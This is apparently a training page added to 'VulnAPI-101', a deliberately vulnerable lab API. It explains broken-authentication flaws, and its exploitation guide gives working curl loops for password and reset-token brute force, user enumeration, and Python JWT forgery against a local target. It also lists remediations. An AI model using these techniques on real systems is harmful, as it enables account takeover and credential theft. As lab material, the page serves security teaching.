@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>API2:2023 - Broken Authentication | VulnAPI-101</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+    <header>
+        <h1>VulnAPI-101 <span class="warning-badge">GUIDES</span></h1>
+        <p>OWASP API Top 10 Vulnerability Reference</p>
+    </header>
+
+    <nav>
+        <ul>
+            <li><a href="/static/index.html">API Testing</a></li>
+            <li><a href="/guides/">Vulnerability Guides</a></li>
+            <li><a href="/guides/by-vulnerability.html">By Vulnerability</a></li>
+            <li><a href="/guides/by-file.html">By File</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <div class="container">
+            <h2><span class="owasp-tag owasp-api2">API2:2023</span> Broken Authentication</h2>
+            <span class="badge badge-danger">CRITICAL SEVERITY</span>
+
+            <h3>Description</h3>
+            <p>Broken Authentication vulnerabilities occur when authentication mechanisms are incorrectly implemented, allowing attackers to compromise authentication tokens, exploit implementation flaws to assume other users' identities, or bypass authentication entirely.</p>
+
+            <h3>Affected Files</h3>
+            <ul>
+                <li><code>app/routes/auth.py</code></li>
+                <li><code>app/utils.py</code></li>
+                <li><code>app/config.py</code></li>
+            </ul>
+
+            <h3>Vulnerabilities Present</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Issue</th>
+                        <th>Location</th>
+                        <th>Impact</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Plain text passwords</td>
+                        <td><code>auth.py</code>, <code>models.py</code></td>
+                        <td>Password exposure in database</td>
+                    </tr>
+                    <tr>
+                        <td>Weak JWT secret</td>
+                        <td><code>config.py</code></td>
+                        <td>Token forgery possible</td>
+                    </tr>
+                    <tr>
+                        <td>No rate limiting</td>
+                        <td><code>auth.py</code></td>
+                        <td>Brute force attacks</td>
+                    </tr>
+                    <tr>
+                        <td>User enumeration</td>
+                        <td><code>auth.py</code></td>
+                        <td>Valid usernames revealed</td>
+                    </tr>
+                    <tr>
+                        <td>Weak reset token</td>
+                        <td><code>utils.py</code></td>
+                        <td>Password reset bypass</td>
+                    </tr>
+                    <tr>
+                        <td>Token in URL/cookies</td>
+                        <td><code>utils.py</code></td>
+                        <td>Token leakage via logs</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="container">
+            <h2>Exploitation Guide</h2>
+
+            <h3>1. User Enumeration</h3>
+            <p>Different error messages reveal whether a user exists:</p>
+            <div class="code-container">
+                <pre><code># Try non-existent user
+curl -X POST http://localhost:5000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "nonexistent", "password": "test"}'
+# Response: {"error": "User not found"} - HTTP 404
+
+# Try existing user with wrong password
+curl -X POST http://localhost:5000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "admin", "password": "wrongpassword"}'
+# Response: {"error": "Invalid password for user admin"} - HTTP 401
+
+# This confirms 'admin' is a valid username!</code></pre>
+            </div>
+
+            <h3>2. Brute Force Attack (No Rate Limiting)</h3>
+            <p>No rate limiting allows unlimited login attempts:</p>
+            <div class="code-container">
+                <pre><code># Brute force script
+for password in password password123 admin admin123 123456 qwerty; do
+  echo "Trying: $password"
+  result=$(curl -s -X POST http://localhost:5000/api/auth/login \
+    -H "Content-Type: application/json" \
+    -d "{\"username\": \"admin\", \"password\": \"$password\"}")
+  if echo "$result" | grep -q "token"; then
+    echo "SUCCESS! Password: $password"
+    echo "$result"
+    break
+  fi
+done</code></pre>
+            </div>
+
+            <h3>3. Weak Password Reset Token</h3>
+            <p>Reset tokens are only 6 digits - easily brute-forceable:</p>
+            <div class="code-container">
+                <pre><code># Request password reset
+curl -X POST http://localhost:5000/api/auth/forgot-password \
+  -H "Content-Type: application/json" \
+  -d '{"email": "admin@vulnapi.local"}'
+
+# Response includes the token! (bad practice)
+# {"reset_token": "123456", ...}
+
+# Even without the response, brute force 6 digits (1M combinations)
+for token in $(seq 100000 999999); do
+  result=$(curl -s -X POST http://localhost:5000/api/auth/reset-password \
+    -H "Content-Type: application/json" \
+    -d "{\"email\": \"admin@vulnapi.local\", \"reset_token\": \"$token\", \"new_password\": \"hacked\"}")
+  if echo "$result" | grep -q "successful"; then
+    echo "Valid token: $token"
+    break
+  fi
+done</code></pre>
+            </div>
+
+            <h3>4. JWT Token Forgery</h3>
+            <p>The JWT secret is weak and predictable:</p>
+            <div class="code-container">
+                <pre><code># Get the weak secret from config endpoint
+curl -s http://localhost:5000/api/admin/config | jq '.config.JWT_SECRET'
+# Returns: "jwt-secret-weak"
+
+# Forge a token using Python
+python3 << 'EOF'
+import jwt
+from datetime import datetime, timedelta
+
+payload = {
+    'user_id': 1,  # Admin user
+    'role': 'admin',
+    'exp': datetime.utcnow() + timedelta(days=365),
+    'iat': datetime.utcnow()
+}
+
+token = jwt.encode(payload, 'jwt-secret-weak', algorithm='HS256')
+print(f"Forged admin token: {token}")
+EOF
+
+# Use the forged token
+curl -X GET http://localhost:5000/api/users/me \
+  -H "Authorization: Bearer <forged_token>"</code></pre>
+            </div>
+
+            <h3>5. Token in URL Parameter</h3>
+            <p>Tokens accepted from URL parameters can leak in logs:</p>
+            <div class="code-container">
+                <pre><code># Token works from query parameter (leaks in server logs, browser history)
+curl "http://localhost:5000/api/users/me?token=<your_token>"
+
+# Also works from cookies
+curl -X GET http://localhost:5000/api/users/me \
+  -H "Cookie: auth_token=<your_token>"</code></pre>
+            </div>
+
+            <h3>6. Password Exposure in Response</h3>
+            <p>Login response includes password in plain text:</p>
+            <div class="code-container">
+                <pre><code># Login returns full user data including password!
+curl -X POST http://localhost:5000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "admin", "password": "admin123"}' | jq '.user.password'
+# Returns: "admin123"</code></pre>
+            </div>
+        </div>
+
+        <div class="container">
+            <h2>Impact</h2>
+            <ul>
+                <li><strong>Account Takeover:</strong> Brute force any account password</li>
+                <li><strong>Identity Spoofing:</strong> Forge tokens to impersonate any user</li>
+                <li><strong>Mass Account Compromise:</strong> Reset any user's password</li>
+                <li><strong>Credential Theft:</strong> Passwords exposed in responses</li>
+                <li><strong>Session Hijacking:</strong> Tokens leak via URLs and logs</li>
+            </ul>
+        </div>
+
+        <div class="container">
+            <h2>Remediation</h2>
+            <ol>
+                <li>Use bcrypt or Argon2 for password hashing</li>
+                <li>Implement rate limiting (e.g., 5 attempts per minute)</li>
+                <li>Use cryptographically secure random secrets for JWT</li>
+                <li>Implement account lockout after failed attempts</li>
+                <li>Use consistent error messages to prevent enumeration</li>
+                <li>Never expose passwords in responses</li>
+                <li>Only accept tokens in Authorization header</li>
+            </ol>
+        </div>
+    </main>
+
+    <footer>
+        <p>VulnAPI-101 - Educational Purposes Only | <a href="https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/">OWASP Reference</a></p>
+    </footer>
+</body>
+</html>
